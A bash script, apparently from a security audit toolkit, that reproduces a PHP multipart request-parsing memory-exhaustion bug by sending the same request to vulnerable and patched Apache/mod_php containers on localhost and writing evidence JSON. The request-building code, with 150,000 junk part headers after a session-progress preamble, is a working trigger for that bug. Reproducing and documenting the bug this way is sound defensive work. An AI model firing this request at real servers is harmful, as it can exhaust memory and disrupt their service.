#!/usr/bin/env bash
# php2shell lab-repro: run the real Apache/mod_php request-parsing differential.
#
# This script does NOT contain or send an exploit payload. It sends one bounded
# multipart request to a deliberately vulnerable image and the same request to
# the patched image, then records what the web SAPI actually did:
#
#   - normal response / parsed request
#   - PHP "Allowed memory size ... exhausted" during request parsing
#   - Apache worker-crash signal in the error log
#
# It produces repro-evidence.json for report.py / run-audit.sh. It does not
# claim RCE: execution_effects is always empty and rce_observed is false.
#
# Exit codes:
#   0  differential or crash observed, evidence written
#   2  unavailable (Docker/image/tool missing, container not ready)
#   3  evidence written but no differential (fatal-both / no-effect / inconclusive)
#   1  internal error
set -uo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
ASSET="lab-php2shell-repro"
OUT=""
V_IMAGE="php:8.4.26-apache"
P_IMAGE="php:8.4.27-apache"
PULL=0
KEEP=0
JSON=0
TIMEOUT=30
BOUNDARY="---------------------------php2shell-lab"
V_NAME=""
P_NAME=""
V_PORT=""
P_PORT=""
BODY_SHA=""
BODY_SIZE=0
STARTED_AT=""

usage() {
  cat <<'EOF'
Usage: lab-repro.sh [options]

Runs one bounded multipart request against vulnerable and patched
Apache/mod_php images and writes repro-evidence.json.

Options:
  --out DIR                 Evidence directory (default: repro-<timestamp>)
  --asset NAME              Asset name (default: lab-php2shell-repro)
  --vulnerable-image IMG    Default: php:8.4.26-apache
  --patched-image IMG       Default: php:8.4.27-apache
  --pull                    Pull missing images first
  --keep                    Keep the two containers after a successful run
  --timeout SEC             curl max time per probe (default: 30)
  --json                    Print the full evidence JSON to stdout
  -h, --help                Show this help

The lab PHP configuration is assets/lab/repro.ini. The target is
assets/lab/repro.php. No exploit payload is included or generated.
EOF
}

log() { printf '[lab-repro] %s\n' "$*" >&2; }

cleanup() {
  if [[ "$KEEP" != 1 ]]; then
    [[ -n "$V_NAME" ]] && docker rm -f "$V_NAME" >/dev/null 2>&1 || true
    [[ -n "$P_NAME" ]] && docker rm -f "$P_NAME" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT INT TERM

while [[ $# -gt 0 ]]; do
  case "$1" in
    --out) OUT="${2:-}"; shift 2 ;;
    --asset) ASSET="${2:-}"; shift 2 ;;
    --vulnerable-image) V_IMAGE="${2:-}"; shift 2 ;;
    --patched-image) P_IMAGE="${2:-}"; shift 2 ;;
    --pull) PULL=1; shift ;;
    --keep) KEEP=1; shift ;;
    --timeout) TIMEOUT="${2:-30}"; shift 2 ;;
    --json) JSON=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) echo "unknown option: $1" >&2; usage; exit 1 ;;
  esac
done

[[ -n "$OUT" ]] || OUT="repro-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUT/raw" || { echo "cannot create $OUT" >&2; exit 1; }
STARTED_AT="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
REQ_BODY="$OUT/raw/request.multipart"

sha256_file() {
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  elif command -v shasum >/dev/null 2>&1; then
    shasum -a 256 "$1" | awk '{print $1}'
  else
    python3 - "$1" <<'PY'
import hashlib, sys
print(hashlib.sha256(open(sys.argv[1], "rb").read()).hexdigest())
PY
  fi
}

json_array_from_docker() {
  docker image inspect --format '{{json .RepoDigests}}' "$1" 2>/dev/null || printf '[]'
}

write_unavailable() {
  local reason="$1"
  python3 - "$OUT/repro-evidence.json" "$ASSET" "$reason" "$REQ_BODY" "$BODY_SHA" "$BODY_SIZE" <<'PY'
import json, os, sys
from datetime import datetime, timezone

path, asset, reason, body_path, body_sha, body_size = sys.argv[1:7]
evidence = {
    "kind": "lab-reproduction",
    "schema": 1,
    "asset": asset,
    "state": "REPRO-UNAVAILABLE",
    "generated_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
    "reason": reason,
    "request": {
        "path": "/repro.php",
        "method": "POST",
        "body": os.path.basename(body_path),
        "body_sha256": body_sha,
        "body_bytes": int(body_size or 0),
    },
    "observations": {
        "execution_effects": [],
        "rce_observed": False,
    },
    "limitations": [
        "No request was sent; the lab runtime or required tool was unavailable.",
        "This artifact is not evidence of exploitation.",
    ],
}
with open(path, "w", encoding="utf-8") as fh:
    json.dump(evidence, fh, indent=2, sort_keys=True)
    fh.write("\n")
print(evidence["state"])
PY
  log "REPRO-UNAVAILABLE: $reason"
  KEEP=0
  cleanup
  trap - EXIT INT TERM
  exit 2
}

# ---- prerequisites ----------------------------------------------------------
for tool in docker curl python3; do
  command -v "$tool" >/dev/null 2>&1 || {
    write_unavailable "$tool not found"
  }
done
docker info >/dev/null 2>&1 || write_unavailable "Docker daemon is not available"

# ---- request body -----------------------------------------------------------
BOUNDARY="$BOUNDARY" python3 - "$REQ_BODY" <<'PY'
import os, sys
boundary = os.environ["BOUNDARY"].encode()
path = sys.argv[1]

def part(name, value, extra=b""):
    return (b"--" + boundary + b"\r\n"
            b'Content-Disposition: form-data; name="' + name + b'"\r\n'
            + extra + b"\r\n" + value + b"\r\n")

with open(path, "wb") as fh:
    # The advisory's early-consumer path needs both the session id and the
    # progress key before the large part.
    fh.write(part(b"PHPSESSID", b"abcdef0123456789abcdef0123456789"))
    fh.write(part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"))
    fh.write(b"--" + boundary + b"\r\n")
    # 8.4.26 stores every header line. 8.4.27 keeps only the headers it uses,
    # so this is the exact allocation-path difference the patch closes.
    for i in range(150000):
        fh.write(b"X-" + str(i).encode() + b": v\r\n")
    fh.write(b'Content-Disposition: form-data; name="f"\r\n\r\nv\r\n')
    fh.write(b"--" + boundary + b"--\r\n")
PY
BODY_SHA="$(sha256_file "$REQ_BODY")"
BODY_SIZE="$(wc -c < "$REQ_BODY" | tr -d ' ')"
log "request body: $BODY_SIZE bytes sha256=$BODY_SHA"

# ---- images -----------------------------------------------------------------
for image in "$V_IMAGE" "$P_IMAGE"; do
  if ! docker image inspect "$image" >/dev/null 2>&1; then
    if [[ "$PULL" == 1 ]]; then
      log "pulling $image"
      docker pull "$image" >/dev/null 2>&1 || write_unavailable "could not pull $image"
    else
      write_unavailable "image not present: $image (rerun with --pull)"
    fi
  fi
done

V_IMAGE_ID="$(docker image inspect --format '{{.Id}}' "$V_IMAGE")"
P_IMAGE_ID="$(docker image inspect --format '{{.Id}}' "$P_IMAGE")"
V_DIGESTS="$(json_array_from_docker "$V_IMAGE")"
P_DIGESTS="$(json_array_from_docker "$P_IMAGE")"

# ---- containers -------------------------------------------------------------
INI="$HERE/../assets/lab/repro.ini"
PROBE="$HERE/../assets/lab/repro.php"
[[ -f "$INI" ]] || write_unavailable "missing lab ini: $INI"
[[ -f "$PROBE" ]] || write_unavailable "missing lab probe: $PROBE"

V_NAME="php2shell-repro-$$-vuln"
P_NAME="php2shell-repro-$$-patched"

start_one() {
  local name="$1" image="$2"
  docker run -d --name "$name" -p 127.0.0.1::80 \
    -v "$INI:/usr/local/etc/php/conf.d/zz-repro.ini:ro" \
    -v "$PROBE:/var/www/html/repro.php:ro" \
    "$image" >/dev/null
}

start_one "$V_NAME" "$V_IMAGE" || write_unavailable "could not start vulnerable container"
start_one "$P_NAME" "$P_IMAGE" || write_unavailable "could not start patched container"

container_port() {
  docker inspect --format '{{(index (index .NetworkSettings.Ports "80/tcp") 0).HostPort}}' "$1" 2>/dev/null
}

wait_ready() {
  local name="$1" role="$2" port i
  for i in $(seq 1 60); do
    port="$(container_port "$name")"
    if [[ -n "$port" ]] && curl -fsS --max-time 2 "http://127.0.0.1:$port/repro.php" \
        > "$OUT/raw/$role.ready.json" 2>/dev/null; then
      printf '%s' "$port"
      return 0
    fi
    sleep 0.5
  done
  return 1
}

V_PORT="$(wait_ready "$V_NAME" vulnerable)" || write_unavailable "vulnerable container did not become ready"
P_PORT="$(wait_ready "$P_NAME" patched)" || write_unavailable "patched container did not become ready"
log "containers ready: vulnerable=$V_PORT patched=$P_PORT"

worker_pids() {
  docker exec "$1" sh -c 'pgrep -x apache2 2>/dev/null | sort -n | tr "\n" " "' 2>/dev/null | sed 's/[[:space:]]*$//'
}

container_running() {
  docker inspect --format '{{.State.Running}}' "$1" 2>/dev/null || printf 'false'
}

# ---- one bounded probe ------------------------------------------------------
probe_one() {
  local role="$1" name="$2" port="$3" image="$4"
  local resp="$OUT/raw/$role.response" hdr="$OUT/raw/$role.headers"
  local err="$OUT/raw/$role.curl.err" before_log="$OUT/raw/$role.apache.before.log"
  local after_log="$OUT/raw/$role.apache.after.log" new_log="$OUT/raw/$role.apache.new.log"
  local before_pids after_pids before_lines after_lines running meta
  local http_status curl_exit

  before_pids="$(worker_pids "$name")"
  docker logs "$name" > "$before_log" 2>&1 || true
  before_lines="$(wc -l < "$before_log" | tr -d ' ')"

  http_status="$(curl -sS --http1.1 --max-time "$TIMEOUT" \
    -o "$resp" -D "$hdr" -w '%{http_code}' \
    -H 'Expect:' \
    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
    --data-binary "@$REQ_BODY" \
    "http://127.0.0.1:$port/repro.php" 2>"$err")"
  curl_exit=$?
  [[ -n "$http_status" ]] || http_status="000"

  after_pids="$(worker_pids "$name")"
  docker logs "$name" > "$after_log" 2>&1 || true
  after_lines="$(wc -l < "$after_log" | tr -d ' ')"
  if (( after_lines >= before_lines )); then
    tail -n +$((before_lines + 1)) "$after_log" > "$new_log" 2>/dev/null || : > "$new_log"
  else
    : > "$new_log"
  fi
  running="$(container_running "$name")"
  meta="$OUT/raw/$role.meta.json"

  python3 - "$meta" "$role" "$name" "$image" "$port" "$http_status" "$curl_exit" \
    "$before_pids" "$after_pids" "$running" "$resp" "$hdr" "$new_log" "$REQ_BODY" <<'PY'
import hashlib, json, os, re, sys

(meta, role, name, image, port, http_status, curl_exit, before_pids,
 after_pids, running, resp_path, hdr_path, log_path, body_path) = sys.argv[1:15]

def read(path, limit=None):
    try:
        data = open(path, "rb").read()
    except OSError:
        return ""
    if limit is not None:
        data = data[:limit]
    return data.decode("utf-8", "replace")

try:
    resp_bytes = open(resp_path, "rb").read()
except OSError:
    resp_bytes = b""
resp = resp_bytes.decode("utf-8", "replace")
headers = read(hdr_path)
new_log = read(log_path)
oom_response = bool(re.search(r"Allowed memory size of \d+ bytes exhausted", resp))
oom_log = bool(re.search(r"Allowed memory size of \d+ bytes exhausted", new_log))
normal = False
try:
    parsed = json.loads(resp)
    normal = parsed.get("probe") == "lab-reproduction"
except (ValueError, TypeError):
    pass
crash = bool(re.search(
    r"exit signal|segmentation fault|zend_mm_heap corrupted|core dumped|AH00051",
    new_log, re.IGNORECASE))
try:
    req_sha = hashlib.sha256(open(body_path, "rb").read()).hexdigest()
except OSError:
    req_sha = ""
meta_obj = {
    "role": role,
    "container": name,
    "image": image,
    "port": int(port),
    "url": f"http://127.0.0.1:{port}/repro.php",
    "http_status": int(http_status) if str(http_status).isdigit() else 0,
    "curl_exit": int(curl_exit),
    "oom_detected": oom_response or oom_log,
    "oom_response_detected": oom_response,
    "oom_log_detected": oom_log,
    "normal_detected": normal,
    "crash_signal": crash,
    "worker_pids_before": before_pids.split(),
    "worker_pids_after": after_pids.split(),
    "worker_pids_changed": before_pids.split() != after_pids.split(),
    "container_running_after": running.strip().lower() == "true",
    "response_sha256": hashlib.sha256(resp_bytes).hexdigest() if resp_bytes else "",
    "response_excerpt": resp[:1200],
    "response_bytes": len(resp_bytes),
    "headers_excerpt": headers[:1200],
    "apache_log_new": new_log.splitlines()[-30:],
    "request_body_sha256": req_sha,
    "raw": {
        "response": os.path.basename(resp_path),
        "headers": os.path.basename(hdr_path),
        "apache_log": os.path.basename(log_path),
    },
}
with open(meta, "w", encoding="utf-8") as fh:
    json.dump(meta_obj, fh, indent=2, sort_keys=True)
    fh.write("\n")
PY
  log "$role: HTTP $http_status curl_exit=$curl_exit"
}

probe_one vulnerable "$V_NAME" "$V_PORT" "$V_IMAGE"
probe_one patched "$P_NAME" "$P_PORT" "$P_IMAGE"

# ---- common provenance ------------------------------------------------------
DOCKER_VERSION="$(docker version --format '{{.Server.Version}}' 2>/dev/null || echo unknown)"
INI_SHA="$(sha256_file "$INI")"
PROBE_SHA="$(sha256_file "$PROBE")"
FINISHED_AT="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

export REPRO_ASSET="$ASSET" REPRO_OUT="$OUT" REPRO_STARTED_AT="$STARTED_AT" \
  REPRO_FINISHED_AT="$FINISHED_AT" REPRO_V_IMAGE="$V_IMAGE" REPRO_P_IMAGE="$P_IMAGE" \
  REPRO_V_IMAGE_ID="$V_IMAGE_ID" REPRO_P_IMAGE_ID="$P_IMAGE_ID" \
  REPRO_V_DIGESTS="$V_DIGESTS" REPRO_P_DIGESTS="$P_DIGESTS" \
  REPRO_V_NAME="$V_NAME" REPRO_P_NAME="$P_NAME" REPRO_V_PORT="$V_PORT" REPRO_P_PORT="$P_PORT" \
  REPRO_BODY_SHA="$BODY_SHA" REPRO_BODY_SIZE="$BODY_SIZE" REPRO_BOUNDARY="$BOUNDARY" \
  REPRO_DOCKER_VERSION="$DOCKER_VERSION" REPRO_HOST="$(hostname 2>/dev/null || echo unknown)" \
  REPRO_INI="$INI" REPRO_PROBE="$PROBE" REPRO_INI_SHA="$INI_SHA" REPRO_PROBE_SHA="$PROBE_SHA" \
  REPRO_KEEP="$KEEP" REPRO_TIMEOUT="$TIMEOUT"

python3 - "$OUT/raw/common.json" <<'PY'
import json, os, sys
path = sys.argv[1]
def digests(name):
    try:
        value = json.loads(os.environ[name])
    except (KeyError, ValueError):
        value = []
    return value if isinstance(value, list) else []
common = {
    "asset": os.environ["REPRO_ASSET"],
    "timestamps": {
        "started_at": os.environ["REPRO_STARTED_AT"],
        "finished_at": os.environ["REPRO_FINISHED_AT"],
    },
    "environment": {
        "docker_version": os.environ["REPRO_DOCKER_VERSION"],
        "host": os.environ["REPRO_HOST"],
        "php_ini": os.path.basename(os.environ["REPRO_INI"]),
        "php_ini_sha256": os.environ["REPRO_INI_SHA"],
        "probe_script": os.path.basename(os.environ["REPRO_PROBE"]),
        "probe_script_sha256": os.environ["REPRO_PROBE_SHA"],
    },
    "images": {
        "vulnerable": {
            "ref": os.environ["REPRO_V_IMAGE"],
            "id": os.environ["REPRO_V_IMAGE_ID"],
            "repo_digests": digests("REPRO_V_DIGESTS"),
        },
        "patched": {
            "ref": os.environ["REPRO_P_IMAGE"],
            "id": os.environ["REPRO_P_IMAGE_ID"],
            "repo_digests": digests("REPRO_P_DIGESTS"),
        },
    },
    "containers": {
        "vulnerable": {
            "name": os.environ["REPRO_V_NAME"],
            "port": int(os.environ["REPRO_V_PORT"]),
            "url": f"http://127.0.0.1:{os.environ['REPRO_V_PORT']}/repro.php",
        },
        "patched": {
            "name": os.environ["REPRO_P_NAME"],
            "port": int(os.environ["REPRO_P_PORT"]),
            "url": f"http://127.0.0.1:{os.environ['REPRO_P_PORT']}/repro.php",
        },
        "kept": os.environ["REPRO_KEEP"] == "1",
    },
    "request": {
        "method": "POST",
        "path": "/repro.php",
        "boundary": os.environ["REPRO_BOUNDARY"],
        "body_sha256": os.environ["REPRO_BODY_SHA"],
        "body_bytes": int(os.environ["REPRO_BODY_SIZE"]),
        "transfer_encoding": "Content-Length (curl --data-binary)",
        "parts": 3,
        "headers_on_large_part": 150000,
        "timeout_seconds": int(os.environ["REPRO_TIMEOUT"]),
        "preamble": ["PHPSESSID", "PHP_SESSION_UPLOAD_PROGRESS"],
        "memory_limit": "8M",
        "post_max_size": "1G",
    },
}
with open(path, "w", encoding="utf-8") as fh:
    json.dump(common, fh, indent=2, sort_keys=True)
    fh.write("\n")
PY

# ---- classify and write evidence --------------------------------------------
python3 - "$OUT" > "$OUT/raw/summary.txt" <<'PY'
import json, os, sys
from datetime import datetime, timezone

out = sys.argv[1]
common = json.load(open(os.path.join(out, "raw", "common.json"), encoding="utf-8"))
v = json.load(open(os.path.join(out, "raw", "vulnerable.meta.json"), encoding="utf-8"))
p = json.load(open(os.path.join(out, "raw", "patched.meta.json"), encoding="utf-8"))

v_crash = bool(v["crash_signal"])
p_crash = bool(p["crash_signal"])
v_oom = bool(v["oom_detected"])
p_oom = bool(p["oom_detected"])
p_normal = bool(p["normal_detected"])
oom_diff = bool(v_oom and not p_oom and p_normal)

if v_crash or p_crash:
    state = "REPRO-CRASH-OBSERVED"
    reason = "A worker crash signal was observed in the Apache log; this is not code execution."
elif oom_diff:
    state = "REPRO-OOM-DIFFERENTIAL"
    reason = "Vulnerable build exhausted memory during multipart parsing; patched build returned the normal probe response."
elif v_oom and p_oom:
    state = "REPRO-FATAL-BOTH"
    reason = "Both builds exhausted memory during parsing; no vulnerable/patched differential was observed."
elif not v_oom and not p_oom:
    state = "REPRO-NO-EFFECT"
    reason = "Neither build exhausted memory on this bounded probe; no differential was observed."
else:
    state = "REPRO-INCONCLUSIVE"
    reason = "The two builds produced an unexpected combination of responses; inspect the raw captures."

evidence = {
    "kind": "lab-reproduction",
    "schema": 1,
    "asset": common["asset"],
    "state": state,
    "generated_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
    "source": "scripts/lab-repro.sh",
    "state_reason": reason,
    "classification": {
        "vulnerable_oom": v_oom,
        "patched_oom": p_oom,
        "patched_normal": p_normal,
        "crash_observed": v_crash or p_crash,
        "oom_differential": oom_diff,
    },
    "request": common["request"],
    "environment": common["environment"],
    "images": common["images"],
    "containers": common["containers"],
    "timestamps": common["timestamps"],
    "observations": {
        "vulnerable": v,
        "patched": p,
        "execution_effects": [],
        "rce_observed": False,
    },
    "limitations": [
        "This probe measures request-parsing OOM behavior, not heap grooming or code execution.",
        "A crash signal or an OOM is not proof of RCE; execution_effects is empty and rce_observed is false.",
        "memory_limit=8M is a lab setting that bounds the request; production exploitation may require different heap layout and limits.",
        "The request is a bounded multipart body with a large number of ignored part headers; it is not an exploit payload.",
    ],
}
path = os.path.join(out, "repro-evidence.json")
with open(path, "w", encoding="utf-8") as fh:
    json.dump(evidence, fh, indent=2, sort_keys=True)
    fh.write("\n")

print(f"REPRO STATE: {state}")
print(f"REASON:      {reason}")
for label, obs in (("vulnerable", v), ("patched", p)):
    print(f"{label:10} HTTP {obs['http_status']} oom={obs['oom_detected']} "
          f"normal={obs['normal_detected']} crash={obs['crash_signal']} "
          f"worker_pids={','.join(obs['worker_pids_after']) or '-'}")
print(f"EVIDENCE:    {path}")
PY

STATE="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["state"])' "$OUT/repro-evidence.json")"
if [[ "$KEEP" == 1 ]]; then
  log "containers kept: $V_NAME ($V_PORT), $P_NAME ($P_PORT)"
  log "cleanup: docker rm -f $V_NAME $P_NAME"
fi
if [[ "$JSON" == 1 ]]; then
  cat "$OUT/repro-evidence.json"
else
  cat "$OUT/raw/summary.txt"
fi
case "$STATE" in
  REPRO-OOM-DIFFERENTIAL|REPRO-CRASH-OBSERVED) exit 0 ;;
  REPRO-FATAL-BOTH|REPRO-NO-EFFECT|REPRO-INCONCLUSIVE) exit 3 ;;
  *) exit 1 ;;
esac
